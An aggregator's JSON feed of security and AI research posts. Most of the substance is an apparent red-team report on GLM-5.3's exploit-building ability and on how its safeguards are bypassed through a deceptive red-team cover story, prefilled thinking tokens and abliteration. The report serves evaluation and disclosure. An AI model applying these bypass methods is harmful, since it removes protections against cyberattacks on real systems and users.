Works\nAgentic cyber defense engineering requires more than adding AI to isolated security tasks. It requires an agentic cyber defense engineering\nRead More\nData Sheet\nCymulate Cowork\nUse AI agents and automated routines to validate exposures and streamline cyber defense engineering.\nRead More\nData Sheet\nCymulate Vero AI\nCymulate Vero AI delivers secure, domain-specific cybersecurity AI with private infrastructure and zero customer data training.\nRead More\nGET A PERSONALIZED DEMO\nReady to see Cymulate in action?\nBook a Demo",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://cymulate.com/blog/agentic-cyber-defense-secops/",
+      "content_chars": 8142,
+      "content_sha256": "3b1f2c8d85620442a2b8f38f5cceb9e7ef4aecfc6801a20874376f8d8cff4e81",
+      "content_fetched_at": "2026-09-30T00:18:22.315388+00:00",
+      "author": "cymulate-blog",
+      "author_name": "Cymulate Blog",
+      "author_url": "https://cymulate.com/blog/",
+      "published_at": "2026-09-30T00:16:27.541665+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:cymulate-blog",
+        "via:llm",
+        "channel:html_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://cymulate.com/blog/",
+        "https://cymulate.com/blog/agentic-cyber-defense-secops/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "cymulate-blog",
+          "url": "https://cymulate.com/blog/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "cymulate-blog",
+          "name": "Cymulate Blog",
+          "home_url": "https://cymulate.com/blog/"
+        },
+        "article": {
+          "title": "Operationalizing Agentic Cyber Defense Engineering for SecOpsRead More",
+          "url": "https://cymulate.com/blog/agentic-cyber-defense-secops/",
+          "content_sha256": "3b1f2c8d85620442a2b8f38f5cceb9e7ef4aecfc6801a20874376f8d8cff4e81"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "llm",
+        "collect_mode": "html_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:05f718f91005aa4d",
+      "who": "openai-research",
+      "who_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "action": "publish",
+      "target": "MentalHealthBench 正式上线MentalHealthBench 是一项基于专家意见设立的基准，用于评估 AI 在真实心理健康对话中能否提供实用且安全的回应。",
+      "target_url": "https://openai.com/zh-Hans-CN/index/introducing-mentalhealthbench/",
+      "text": "openai-research published: MentalHealthBench 正式上线MentalHealthBench 是一项基于专家意见设立的基准，用于评估 AI 在真实心理健康对话中能否提供实用且安全的回应。",
+      "at": "2026-09-30T00:16:27.541665+00:00",
+      "external_id": "a:05f718f91005aa4d",
+      "url": "https://openai.com/zh-Hans-CN/index/introducing-mentalhealthbench/",
+      "title": "MentalHealthBench 正式上线MentalHealthBench 是一项基于专家意见设立的基准，用于评估 AI 在真实心理健康对话中能否提供实用且安全的回应。",
+      "content": "openai-research published: MentalHealthBench 正式上线MentalHealthBench 是一项基于专家意见设立的基准，用于评估 AI 在真实心理健康对话中能否提供实用且安全的回应。",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://openai.com/zh-Hans-CN/index/introducing-mentalhealthbench/",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-09-30T00:19:20.695639+00:00",
+      "author": "openai-research",
+      "author_name": "OpenAI Research",
+      "author_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "published_at": "2026-09-30T00:16:27.541665+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:openai-research",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://openai.com/zh-Hans-CN/research/index/",
+        "https://openai.com/zh-Hans-CN/index/introducing-mentalhealthbench/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "openai-research",
+          "url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "openai-research",
+          "name": "OpenAI Research",
+          "home_url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "article": {
+          "title": "MentalHealthBench 正式上线MentalHealthBench 是一项基于专家意见设立的基准，用于评估 AI 在真实心理健康对话中能否提供实用且安全的回应。",
+          "url": "https://openai.com/zh-Hans-CN/index/introducing-mentalhealthbench/",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "blocked",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:787fde03d4dfa447",
+      "who": "openai-research",
+      "who_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "action": "publish",
+      "target": "在 API 中使用 GPT-Live-1 构建更自然的语音体验GPT‑Live‑1 为 API 带来自然的全双工语音对话，并增强了指令遵循能力、自定义语音和电话支持。",
+      "target_url": "https://openai.com/zh-Hans-CN/index/introducing-gpt-live-1-in-the-api/",
+      "text": "openai-research published: 在 API 中使用 GPT-Live-1 构建更自然的语音体验GPT‑Live‑1 为 API 带来自然的全双工语音对话，并增强了指令遵循能力、自定义语音和电话支持。",
+      "at": "2026-09-30T00:16:27.541665+00:00",
+      "external_id": "a:787fde03d4dfa447",
+      "url": "https://openai.com/zh-Hans-CN/index/introducing-gpt-live-1-in-the-api/",
+      "title": "在 API 中使用 GPT-Live-1 构建更自然的语音体验GPT‑Live‑1 为 API 带来自然的全双工语音对话，并增强了指令遵循能力、自定义语音和电话支持。",
+      "content": "openai-research published: 在 API 中使用 GPT-Live-1 构建更自然的语音体验GPT‑Live‑1 为 API 带来自然的全双工语音对话，并增强了指令遵循能力、自定义语音和电话支持。",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://openai.com/zh-Hans-CN/index/introducing-gpt-live-1-in-the-api/",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-09-30T00:19:31.402296+00:00",
+      "author": "openai-research",
+      "author_name": "OpenAI Research",
+      "author_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "published_at": "2026-09-30T00:16:27.541665+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:openai-research",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://openai.com/zh-Hans-CN/research/index/",
+        "https://openai.com/zh-Hans-CN/index/introducing-gpt-live-1-in-the-api/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "openai-research",
+          "url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "openai-research",
+          "name": "OpenAI Research",
+          "home_url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "article": {
+          "title": "在 API 中使用 GPT-Live-1 构建更自然的语音体验GPT‑Live‑1 为 API 带来自然的全双工语音对话，并增强了指令遵循能力、自定义语音和电话支持。",
+          "url": "https://openai.com/zh-Hans-CN/index/introducing-gpt-live-1-in-the-api/",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "blocked",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:6cee14e882426586",
+      "who": "openai-research",
+      "who_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "action": "publish",
+      "target": "OpenAI 模型提出纳维–斯托克斯问题的解法我们在此分享由 AI 生成的纳维–斯托克斯千禧年大奖难题解法，包括相关论文和 Lean 形式化证明。",
+      "target_url": "https://openai.com/zh-Hans-CN/index/navier-stokes-solution/",
+      "text": "openai-research published: OpenAI 模型提出纳维–斯托克斯问题的解法我们在此分享由 AI 生成的纳维–斯托克斯千禧年大奖难题解法，包括相关论文和 Lean 形式化证明。",
+      "at": "2026-09-30T00:16:27.541665+00:00",
+      "external_id": "a:6cee14e882426586",
+      "url": "https://openai.com/zh-Hans-CN/index/navier-stokes-solution/",
+      "title": "OpenAI 模型提出纳维–斯托克斯问题的解法我们在此分享由 AI 生成的纳维–斯托克斯千禧年大奖难题解法，包括相关论文和 Lean 形式化证明。",
+      "content": "openai-research published: OpenAI 模型提出纳维–斯托克斯问题的解法我们在此分享由 AI 生成的纳维–斯托克斯千禧年大奖难题解法，包括相关论文和 Lean 形式化证明。",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://openai.com/zh-Hans-CN/index/navier-stokes-solution/",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-09-30T00:19:42.101624+00:00",
+      "author": "openai-research",
+      "author_name": "OpenAI Research",
+      "author_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "published_at": "2026-09-30T00:16:27.541665+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:openai-research",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://openai.com/zh-Hans-CN/research/index/",
+        "https://openai.com/zh-Hans-CN/index/navier-stokes-solution/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "openai-research",
+          "url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "openai-research",
+          "name": "OpenAI Research",
+          "home_url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "article": {
+          "title": "OpenAI 模型提出纳维–斯托克斯问题的解法我们在此分享由 AI 生成的纳维–斯托克斯千禧年大奖难题解法，包括相关论文和 Lean 形式化证明。",
+          "url": "https://openai.com/zh-Hans-CN/index/navier-stokes-solution/",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "blocked",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:8ff0437b1e3b01f7",
+      "who": "openai-research",
+      "who_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "action": "publish",
+      "target": "研究加速：OpenAI 内部视角在 OpenAI 内部，编程智能体正在重塑 AI 研究。探索有关智能体使用情况、实验速度、任务复杂度和研究加速的早期数据。",
+      "target_url": "https://openai.com/zh-Hans-CN/index/research-acceleration-view-inside-openai/",
+      "text": "openai-research published: 研究加速：OpenAI 内部视角在 OpenAI 内部，编程智能体正在重塑 AI 研究。探索有关智能体使用情况、实验速度、任务复杂度和研究加速的早期数据。",
+      "at": "2026-09-30T00:16:27.541665+00:00",
+      "external_id": "a:8ff0437b1e3b01f7",
+      "url": "https://openai.com/zh-Hans-CN/index/research-acceleration-view-inside-openai/",
+      "title": "研究加速：OpenAI 内部视角在 OpenAI 内部，编程智能体正在重塑 AI 研究。探索有关智能体使用情况、实验速度、任务复杂度和研究加速的早期数据。",
+      "content": "openai-research published: 研究加速：OpenAI 内部视角在 OpenAI 内部，编程智能体正在重塑 AI 研究。探索有关智能体使用情况、实验速度、任务复杂度和研究加速的早期数据。",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://openai.com/zh-Hans-CN/index/research-acceleration-view-inside-openai/",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-09-30T00:19:52.791098+00:00",
+      "author": "openai-research",
+      "author_name": "OpenAI Research",
+      "author_url": "https://openai.com/zh-Hans-CN/research/index/",
+      "published_at": "2026-09-30T00:16:27.541665+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:openai-research",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://openai.com/zh-Hans-CN/research/index/",
+        "https://openai.com/zh-Hans-CN/index/research-acceleration-view-inside-openai/"
+      ],
+      "refs": {
+        "actor": {
+          "login": "openai-research",
+          "url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "openai-research",
+          "name": "OpenAI Research",
+          "home_url": "https://openai.com/zh-Hans-CN/research/index/"
+        },
+        "article": {
+          "title": "研究加速：OpenAI 内部视角在 OpenAI 内部，编程智能体正在重塑 AI 研究。探索有关智能体使用情况、实验速度、任务复杂度和研究加速的早期数据。",
+          "url": "https://openai.com/zh-Hans-CN/index/research-acceleration-view-inside-openai/",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "blocked",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:80e4ef842b12917f",
+      "who": "anthropic-research",
+      "who_url": "https://www.anthropic.com/research",
+      "action": "publish",
+      "target": "Sep 29, 2026Frontier Red TeamGLM-5.3 and the spread of advanced cyber capabilities",
+      "target_url": "https://www.anthropic.com/research/glm-5-3-and-the-spread-of-advanced-cyber-capabilities",
+      "text": "anthropic-research published: Sep 29, 2026Frontier Red TeamGLM-5.3 and the spread of advanced cyber capabilities",
+      "at": "2026-09-30T00:16:27.541665+00:00",
+      "external_id": "a:80e4ef842b12917f",
+      "url": "https://www.anthropic.com/research/glm-5-3-and-the-spread-of-advanced-cyber-capabilities",
+      "title": "Sep 29, 2026Frontier Red TeamGLM-5.3 and the spread of advanced cyber capabilities",
+      "content": "Frontier Red Team\nPolicy\nGLM-5.3 and the spread of advanced cyber capabilities\nSep 29, 2026\nAndrew Fasano, Marius Fleischer\nCole McFaul, Robert Xiao, Tripp Gallagher\nFive months ago, we\nannounced\nClaude Mythos Preview, the first AI model that could autonomously build sophisticated, end-to-end cyber exploits. The rapid rate of improvement in AI suggested to us that this ability would eventually proliferate to many other models, making it much easier for malicious cyber actors to launch highly impactful cyberattacks.\nIn light of these considerations, we chose to release Claude Mythos Preview in a limited way, through Project Glasswing—which enabled trusted cyber defenders to find\nmore than 10,000 vulnerabilities\nin critical software, giving them a head start before malicious actors had access to similarly capable models.\nBut those models have now arrived. In this post, we share our analysis of GLM-5.3, the latest AI model developed by Zhipu AI (known outside of China as Z.ai). Like Claude Mythos Preview, GLM-5.3 has strong capabilities for autonomously building end-to-end cyber exploits. But GLM-5.3 is unlike other frontier models in that it has been released without meaningful safeguards to limit misuse. We find that attackers can bypass GLM-5.3’s safeguards between 64% and 100% of the time with simple techniques in our simulated tests. In contrast, these attacks did not succeed against safeguarded Claude models in our testing. We assess that GLM-5.3’s lax safeguards significantly increase the cyber capabilities available to malicious actors. At the same time, these capabilities can also benefit defenders working to secure their systems.\nOn Sept. 17, NIST’s Center for AI Standards and Innovation (CAISI) published\nits own assessment\nof GLM-5.3’s cyber capabilities. CAISI found that GLM-5.3 is “the most cyber-capable open-weight model released to date” and that it lags the US frontier by about four months on an aggregate of CAISI’s cyber benchmarks. Our capability findings broadly match CAISI’s. In CAISI’s comparison, US models were tested with cyber safeguards disabled when applicable, and the US frontier includes models released only to vetted users. Attackers can’t readily access those versions of US models, but anyone can download GLM-5.3. This post adds our analysis of how easily GLM-5.3’s safeguards can be bypassed or removed.\nFigure 1.\nSummary of findings. Top: The increase in exploitation capability between Claude Opus 4.6 and Claude Mythos Preview mirrors the jump in capabilities between GLM-5.2 and GLM-5.3. Claude models are released with cyber safeguards, and versions with reduced safeguards are limited to vetted users. Anyone can download and use GLM-5.3. Bottom: The limited safeguards in GLM-5.3 can be bypassed with standard techniques that did not work against, or do not apply to, Claude models in our testing.\nGLM-5.3 can develop working exploits end to end\nTo understand how GLM-5.3 could enable cyber threat actors to find and exploit real software vulnerabilities, we ran evaluations using automated benchmarks and human-in-the-loop workflows. For both approaches, we ran the tested models in isolated and sandboxed environments so they can only attack offline targets that we have set up for the purposes of these evaluations. We focus primarily on exploit development capability, as this is where Claude Mythos Preview demonstrated a notable jump versus previous Claude models.\nFirst, we ran the model on\nExploitBench\n, which measures how well AI models can exploit known vulnerabilities in the V8 engine used by Google Chrome. Here we focus on the models’ ability to develop end-to-end exploits successfully, as this is the most relevant capability for attackers, and where we see significant changes between models. We find that GLM-5.3 develops end-to-end exploits in 50 of 410 attempts. Claude Mythos Preview did so at a similar rate—in 56 of 410 attempts.\nIn our internal Binary Exploitation benchmark,\n1\nwe test whether models can find and exploit vulnerabilities in popular open source projects that participate in Google’s OSS-Fuzz project. Here, full credit is awarded for a full control-flow hijack. We evaluate several models on 100 tasks from the benchmark (selected at random), and find that GLM-5.3 develops full control flow hijacks in 4% of the trials; Claude Mythos Preview did so in 6%. Although GLM-5.3 performs below Claude Mythos Preview here, a meaningful threshold has clearly been crossed: earlier models, like Claude Opus 4.6 and GLM-5.2, do not succeed in any of them.\nFigure 2.\nExploitation capability versus output-token budget. Each line shows the share of a model’s attempts that reached the benchmark’s top outcome versus the output tokens used. Both figures show performance of two Claude models run with safeguards disabled (Opus 4.6, Mythos Preview), two GLM models (5.2 and 5.3), and results from the latest open-weight models released by Moonshot AI (Kimi K3) and DeepSeek (V4.1-Flash).\nNext, we evaluated how GLM-5.3 performs on open-ended offensive cyber tasks in the hands of human experts (mirroring our\ntesting with Claude Mythos Preview\nearlier this year). Here, we select targets in which the human experts are unaware of existing vulnerabilities, then ask them to use the model to identify and exploit novel flaws. These experiments tested what the experts could do in a short time-frame: they typically ran for a day or less, with less than an hour of human focus in total.\nFigure 3.\nA redacted screenshot of an exploit page generated by GLM-5.3 during researcher-driven testing, shown stealing a user’s SSH private key via a malicious website. The exploit chains together multiple 0-day vulnerabilities the model discovered in a component of a popular web browser, reading a sensitive file off the user’s computer.\nIn the first of these sessions, a researcher used GLM-5.3 on a sandboxed machine with a local Linux build of a popular web browser. Over the course of a day (and with limited human attention), GLM-5.3 found several previously unknown vulnerabilities in the browser’s JavaScript engine, and chained them together into a working exploit: a webpage that, when visited, reads arbitrary files from the visitor’s computer (shown in Figure 3). This exploit targets the Linux build of the browser, since that was the only environment made available to the model. However, we believe these vulnerabilities could also impact users on other platforms, though the path to exploitation there may be more complex. (We’ve disclosed these vulnerabilities to the maintainer.) Later in the session, the researcher also identified exploitable vulnerabilities in several other widely used systems with GLM-5.3, including wireless and graphics drivers and network-facing device software. We are currently reviewing these reports and we will disclose to maintainers as appropriate.\nIn a second session, a researcher used GLM-5.3-Flash (a smaller, less capable version of GLM-5.3) to develop an exploit for a\nknown\nvulnerability (we’ve previously written about these “N-day” vulnerability exploits\nhere\n). Here, the researcher focused on a recently disclosed flaw in Google Chrome (CVE-2026-11645) to see how quickly the model could turn a public fix into a working attack. The researcher provided GLM-5.3-Flash with public details of this CVE and another known flaw. With no significant direction from the researcher, GLM-5.3-Flash chained together exploits for these two flaws, building a reliable exploit chain for an ARM64 target, bypassing pointer-authentication (PAC) hardening. This took 20 minutes of human attention, plus 8 hours of work for GLM-5.3-Flash. At Zhipu’s API prices, this effort would have cost $20.40.\nGLM-5.3 lacks robust safeguards\nGLM-5.3 has been released with some built-in safeguards: if a user asks for something clearly harmful, the model will often refuse.\n2\nIn our testing, we found that these safeguards could be bypassed or removed with a variety of simple techniques.\nThe most intensive—and most successful—method is a\nstandard refusal reduction technique\nknown as “abliteration”. Since GLM-5.3 is released as an open-weight model, users can reconfigure it to remove its refusals with little change in its capabilities. Several developers released abliterated versions of GLM-5.3 to the public within days of the model’s release.\nTo research how far abliteration allows attackers to bypass GLM-5.3’s safeguards, we produced an abliterated copy ourselves, and then ran it on three public benchmarks (\nJailbreakBench\n,\nHarmBench\n, and\nStrongREJECT\n) that measure how often a model complies with clearly harmful requests. Abliterating the model took our team—which had never previously attempted this task—about 2,200 GPU hours at a computation cost of roughly $4,400.\n3\nAbliterating GLM-5.3-Flash took about 600 GPU hours. The edit took GLM-5.3’s refusal rate from above 90% to about 3% and 2% on the first two benchmarks (JailbreakBench and HarmBench) and to 12% on the third (StrongREJECT). Abliteration did not significantly reduce the model’s capabilities: on GPQA-Diamond, an evaluation that measures general scientific capabilities, the standard and abliterated models scored the same results; on a tested subset of the CyberGym evaluations, the abliterated version scored a few percent lower (as shown in the chart below).\nFigure 4.\nTop: Mean refusal rates across JailbreakBench, HarmBench, and StrongREJECT for the released and abliterated GLM models and for Claude models. After abliteration, the GLM models rarely refuse these queries. Claude models cannot be abliterated because their weights aren’t publicly released or customizable. Bottom: Performance of GLM-5.3 and GLM-5.3-Flash versus their abliterated variants on GPQA-Diamond and CyberGym. Abliteration leaves capability largely intact.\nIn our testing, we observed that GLM-5.3’s safeguards can also be circumvented\nwithout\nusing an abliterated version of the model. We placed the model in a simulated world\n4\nin which it was given overtly malicious requests to attack critical systems. Out of the box, GLM-5.3 refused in all trials (as with the other models we tested). But we identified several simple ways to bypass the GLM models’ safeguards, such that it would respond to these requests in most or all cases. These include:\nProviding a deceptive prompt, such as telling the model that it is an autonomous red-team agent working on an exercise. This gets GLM-5.3 to engage 64% of the time.\nPrefilling the models’ thinking tokens so that it appears to have considered the user’s request and decided to proceed. This gets GLM-5.3 to engage 92% of the time.\nUsing an abliterated version of the model, as described above. This gets GLM-5.3 to engage 100% of the time.\nIn our testing, none of these techniques got safeguarded Claude models to carry out the harmful tasks we tested. Claude’s safeguards blocked the requests that used deceptive prompts. The Anthropic API provides would-be attackers with no way to prefill Claude’s thinking. And since Claude’s weights are not provided to users, they cannot be abliterated to change Claude’s behavior.\nFigure 5.\nRate at which each model tried to connect to a remote target system after an overtly harmful request by model and bypass condition (50 samples per cell, five attack orders × two targets × five attempts). GLM-5.3 rises from zero engagement on direct requests to 64%, 92%, and 100% under a cover story, prefill, and abliteration respectively, while every tested Claude model stays at zero under API safeguards. Padlocked cells mark attacks that are not generally feasible against the Claude API.\nTo demonstrate how the abliterated version of GLM-5.3 is willing to engage in harmful tasks, we highlight one quote from the chain of thought that it generated:\nFigure 6.\nIn our simulated environment, the abliterated version of GLM-5.3 considers how to engage in an overtly harmful request, ultimately deciding to follow the user’s instructions despite some initial ethical concerns. Text is quoted verbatim from the model’s chain of thought.\nWhat does this mean?\nGLM-5.3 will likely give malicious actors access to capabilities that will allow them to find and exploit cyber vulnerabilities without meaningful restrictions. This is unlike any other similarly capable AI model, all of which were released with safeguards or through limited access programs. The release of GLM-5.3 is a meaningful step change in the cyber capabilities available to attackers.\nAnthropic\nand\nother US AI labs\nhave published recent reports that disclose how cyber attackers have tried to use AI systems. Given this evidence, we think it’s likely both state and non-state actors will use models like GLM-5.3 to cause real-world harm.\nOn the other hand, models with this level of capability can also be used by defenders. Our view is that cyber defenders should use the best available tools that meet their needs. We're working to safely expand access to Claude's cyber capabilities to as many defenders as we can. Cyber defenders face attackers who will use every capable tool they can, and we believe defenders should be equipped with frontier models that are at least as good as those their adversaries are using.\nThrough Project Glasswing (and other efforts, like\nPatch the Planet\n), cyber defenders have made meaningful progress towards securing critical systems in advance of this moment—but much work remains to be done. While vetted defenders can now use even more advanced models like Claude Mythos 5.1 through our trusted access programs, a critical threshold in freely accessible capabilities has now been crossed. GLM-5.3 underscores the urgency of expanding access to advanced frontier models to a broader set of entities to empower cyber defenders.\nGovernments should conduct safety testing on sufficiently capable AI models, including successors to GLM-5.3. Without high quality evaluations from independent sources, the impact of these capabilities might not become fully clear to model developers until it is too late. As AI developers across the world build increasingly capable open weight models, we hope they work to appropriately safeguard these capabilities and prevent misuse.\nFootnotes\nWe have previously published results from this benchmark under the name “OSS-Fuzz”; here we tested models on a randomly selected subset of 100 tasks from this evaluation.\nThe cyber tasks detailed in the prior section did not trigger such refusals on the released model, but we observe refusals if we ask GLM-5.3 for assistance developing malware or helping launch cyberattacks against remote targets.\nMost of this went to exploring variants in parallel and to testing model capabilities after modifications. We estimate a team experienced with the technique, starting from scratch on this model, would need closer to 600 GPU hours ($1,200).\nNo model-generated code is ever executed in this simulation and the model does not have any way to interact with external systems. In this isolated test environment the model under evaluation is given access to a fake bash tool which does not execute the provided code. Instead, we ask another LLM to approximate the command’s result given a description of the simulated world. These simulations are not perfect portrayals of real-world conditions, and are therefore imperfect measures of how a model would behave in a given situation.\nRelated content\nWhat do you want from AI?\nWe’re launching a new study using Anthropic Interviewer to learn from your experiences with AI, and we invite you to participate.\nRead more\nYes, Claude can do Nine Loops\nGuest writer and physicist Matt von Hippel shares what happened when he issued a challenge to AI companies to solve a problem in his former subfield of theoretical physics.\nRead more\nProject Swap: What happens when agents trade for us?\nTo see what works and what breaks when agents are sent into a market, we made a miniature market of Claudes.\nRead more\nSubscribe to the Frontier Red Team newsletter\nGet updates on our latest red-teaming research and findings.",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://www.anthropic.com/research/glm-5-3-and-the-spread-of-advanced-cyber-capabilities",
+      "content_chars": 16100,
+      "content_sha256": "ec1cfbd6d8a3f825edb685b15b766d4122d028100de9e1358c14657ece0d2bdb",
+      "content_fetched_at": "2026-09-30T00:19:55.568168+00:00",
+      "author": "anthropic-research",
+      "author_name": "Anthropic Research",
+      "author_url": "https://www.anthropic.com/research",
+      "published_at": "2026-09-30T00:16:27.541665+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:anthropic-research",
+        "via:llm",
+        "channel:html_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.anthropic.com/research",
+        "https://www.anthropic.com/research/glm-5-3-and-the-spread-of-advanced-cyber-capabilities"
+      ],
+      "refs": {
+        "actor": {
+          "login": "anthropic-research",
+          "url": "https://www.anthropic.com/research"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "anthropic-research",
+          "name": "Anthropic Research",
+          "home_url": "https://www.anthropic.com/research"
+        },
+        "article": {
+          "title": "Sep 29, 2026Frontier Red TeamGLM-5.3 and the spread of advanced cyber capabilities",
+          "url": "https://www.anthropic.com/research/glm-5-3-and-the-spread-of-advanced-cyber-capabilities",
+          "content_sha256": "ec1cfbd6d8a3f825edb685b15b766d4122d028100de9e1358c14657ece0d2bdb"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "llm",
+        "collect_mode": "html_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:9500df075a9b45c2",
+      "who": "watchtowr-labs",
+      "who_url": "https://labs.watchtowr.com/",
+      "action": "publish",
+      "target": "Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772)",
+      "target_url": "https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/",
+      "text": "watchtowr-labs published: Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772)",
+      "at": "2026-09-29T13:55:35+00:00",
+      "external_id": "a:9500df075a9b45c2",
+      "url": "https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/",
+      "title": "Here We Go Again (Citrix NetScaler DTLS Preauth Memory Overflow CVE-2026-88772)",
+      "content": "Part 1 of this week's saga can be found\nhere.\nThis research is a glimpse into the capabilities that power our Preemptive Exposure Management solution, enabling organizations to rapidly react to emerging threats: the\nwatchTowr Platform.\nWhat Is A Citrix NetScaler?\nNetScaler, from Citrix (now under Cloud Software Group), is an application delivery controller - some believe it qualifies to be described as a security appliance. It sits in front of an organization's applications and handles load balancing, traffic management, and SSL/TLS termination. NetScaler Gateway adds VPN and secure remote access.\nWhat Is the Purpose of a Security Appliance?\nA security appliance exists to keep an organization secure by standing between its systems and threats that attempt to reach them. It concentrates a defensive function, controlling remote access, filtering hostile traffic, or enforcing who is allowed in, at a single chokepoint that every connection has to pass through.\nWhat Does \"Hardened\" Mean In \"Hardened Security Appliance\"?\n\"Hardened\" means the vendor has stripped the device down and locked it up: minimal running services, restricted shell access, a controlled update path, and defaults tuned for security.\nThe premise is that it is tougher to break into than a general-purpose server.\nWhat is CVE-2026-88772, and When Will This End?\nAs we discussed in\nyesterday's blog post\n, the advisory released by Citrix on Sunday did not just contain one in-the-wild exploited vulnerability - but two. Today, we're going to be 